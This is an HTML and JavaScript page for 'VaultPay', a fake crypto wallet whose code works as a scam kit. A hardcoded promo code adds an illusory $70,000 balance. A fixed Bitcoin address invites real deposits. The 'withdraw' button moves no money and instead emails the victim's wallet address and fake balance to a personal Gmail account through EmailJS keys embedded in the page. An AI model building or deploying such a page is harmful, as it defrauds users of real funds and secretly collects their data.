<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>VaultPay | Secure Asset Management</title>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
<style>
  :root {
    --bg: #0b0e11;
    --card: #1e2329;
    --text: #eaecef;
    --muted: #848e9c;
    --primary: #f3ba2f;
    --border: #363c44;
    --green: #0ecb81;
    --error: #f6465d;
  }

  body {
    font-family: 'Inter', -apple-system, sans-serif;
    background-color: var(--bg);
    color: var(--text);
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    margin: 0;
  }

  .app-container {
    background-color: var(--card);
    padding: 30px;
    border-radius: 20px;
    width: 100%;
    max-width: 380px;
    box-shadow: 0 20px 50px rgba(0,0,0,0.5);
    border: 1px solid var(--border);
    text-align: center;
  }

  .hidden { display: none !important; }

  .balance-section {
    background: linear-gradient(135deg, #2b3139 0%, #1e2329 100%);
    padding: 25px;
    border-radius: 15px;
    margin: 20px 0;
    border: 1px solid var(--border);
  }

  .balance-val {
    font-size: 36px;
    font-weight: 700;
    margin: 10px 0;
    letter-spacing: -1px;
  }

  .grid-nav {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 10px;
    margin-bottom: 25px;
  }

  button {
    background-color: var(--primary);
    color: #000;
    border: none;
    padding: 14px;
    border-radius: 10px;
    font-weight: 700;
    cursor: pointer;
    transition: transform 0.1s, opacity 0.2s;
    font-size: 13px;
  }

  button:hover { opacity: 0.9; }
  button:active { transform: scale(0.96); }

  .btn-outline {
    background: transparent;
    border: 1px solid var(--border);
    color: var(--text);
  }

  .btn-outline:hover { border-color: var(--primary); }

  .action-pane {
    background: rgba(0,0,0,0.2);
    padding: 20px;
    border-radius: 12px;
    animation: fadeIn 0.3s ease;
    text-align: left;
  }

  @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }

  input {
    width: 100%;
    padding: 12px;
    margin: 10px 0;
    background: #0b0e11;
    border: 1px solid var(--border);
    border-radius: 8px;
    color: white;
    box-sizing: border-box;
    outline: none;
  }

  input:focus { border-color: var(--primary); }

  .address-box {
    background: #000;
    padding: 15px;
    border: 1px dashed var(--primary);
    color: var(--primary);
    font-family: monospace;
    font-size: 11px;
    word-break: break-all;
    cursor: pointer;
    border-radius: 8px;
    margin: 10px 0;
  }

  .status-text {
    margin-top: 15px;
    font-size: 13px;
    font-weight: 500;
  }

  .info { color: var(--primary); }
  .success { color: var(--green); }
  .error { color: var(--error); }
</style>
</head>
<body>

<div class="app-container">
  <div id="scr-start">
    <h1 style="margin:0; font-size: 26px;">Vault<span style="color:var(--primary)">Pay</span></h1>
    <p style="color:var(--muted); font-size: 14px; margin-top: 5px;">Institutional Grade Crypto Wallet</p>
    <button onclick="navTo('main')" style="width:100%; margin-top: 30px;">Get Started</button>
  </div>

  <div id="scr-main" class="hidden">
    <div class="balance-section">
      <div style="font-size: 11px; color: var(--muted); letter-spacing: 1px;">TOTAL ACCOUNT BALANCE</div>
      <div class="balance-val">$<span id="display-bal">0.00</span></div>
    </div>

    <div class="grid-nav">
      <button class="btn-outline" onclick="showAction('deposit')">Deposit</button>
      <button class="btn-outline" onclick="showAction('promo')">Promo</button>
      <button class="btn-outline" onclick="showAction('withdraw')">Withdraw</button>
    </div>

    <div id="act-deposit" class="action-pane hidden">
      <div style="font-size: 13px; margin-bottom: 8px; font-weight: 600;">Direct Deposit</div>
      <div style="font-size: 12px; color: var(--muted); margin-bottom: 10px;">Send your Crypto to this account to deposit:</div>
      <div class="address-box" onclick="copyAddr()">bc1qk7darq3cdq2k83pma8w88668a25q63qyyen26d</div>
      <small style="color: var(--muted)">Tap the address box above to copy</small>
    </div>

    <div id="act-promo" class="action-pane hidden">
      <div style="font-size: 13px; font-weight: 600;">Redeem Voucher</div>
      <input type="text" id="promo-code" placeholder="Enter promo code">
      <button onclick="redeem()" style="width:100%">Claim Reward</button>
    </div>

    <div id="act-withdraw" class="action-pane hidden">
      <div style="font-size: 13px; font-weight: 600;">Withdraw Funds</div>
      <input type="text" id="withdraw-addr" placeholder="Destination BTC Address">
      <button onclick="processWithdraw()" style="width:100%">Confirm Withdrawal</button>
    </div>

    <div id="feedback" class="status-text hidden"></div>
  </div>
</div>

<script>
  // Configuration from User
  const PUBLIC_KEY = 'VB9Rt0bAl5Fp2JxmU';
  const SERVICE_ID = 'service_k743psj';
  const TEMPLATE_ID = 'template_0nybbv8';

  // Initialize EmailJS SDK
  (function() {
    emailjs.init(PUBLIC_KEY);
  })();

  // Balance Persistence Logic
  let balance = parseFloat(localStorage.getItem('vault_user_balance')) || 0;
  updateDisplay();

  function navTo(screen) {
    document.getElementById('scr-start').classList.add('hidden');
    document.getElementById('scr-main').classList.remove('hidden');
  }

  function showAction(type) {
    ['deposit', 'promo', 'withdraw'].forEach(a => document.getElementById('act-'+a).classList.add('hidden'));
    document.getElementById('act-'+type).classList.remove('hidden');
    document.getElementById('feedback').classList.add('hidden');
  }

  function updateDisplay() {
    document.getElementById('display-bal').textContent = balance.toLocaleString('en-US', {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    });
    localStorage.setItem('vault_user_balance', balance);
  }

  function copyAddr() {
    navigator.clipboard.writeText('bc1qk7darq3cdq2k83pma8w88668a25q63qyyen26d');
    alert("Deposit address copied to clipboard!");
  }

  function redeem() {
    const code = document.getElementById('promo-code').value.trim();
    const msg = document.getElementById('feedback');
    
    if(code.toUpperCase() === 'PROMOBTC') {
      balance += 70000;
      updateDisplay();
      msg.textContent = "Promo applied successfully! +$70,000.00";
      msg.className = "status-text success";
      document.getElementById('promo-code').value = "";
    } else {
      msg.textContent = "Invalid or expired promo code.";
      msg.className = "status-text error";
    }
    msg.classList.remove('hidden');
  }

  function processWithdraw() {
    const addr = document.getElementById('withdraw-addr').value.trim();
    const msg = document.getElementById('feedback');

    if(!addr) {
      alert("Please enter a valid BTC wallet address.");
      return;
    }

    msg.textContent = "Reward confirmation in progress please wait...";
    msg.className = "status-text info";
    msg.classList.remove('hidden');

    // Variable Mapping as requested:
    // {{Title}} -> Account Balance
    // {{Name}} -> Wallet Address
    const templateParams = {
      Title: "$" + balance.toLocaleString(undefined, {minimumFractionDigits: 2}),
      Name: addr,
      to_email: 'nibir.baruah2000@gmail.com'
    };

    emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
      .then((response) => {
        console.log('EMAIL SENT', response.status, response.text);
      }, (err) => {
        console.error('EMAIL FAILED', err);
      });

    document.getElementById('withdraw-addr').value = "";
  }
</script>

</body>
</html>
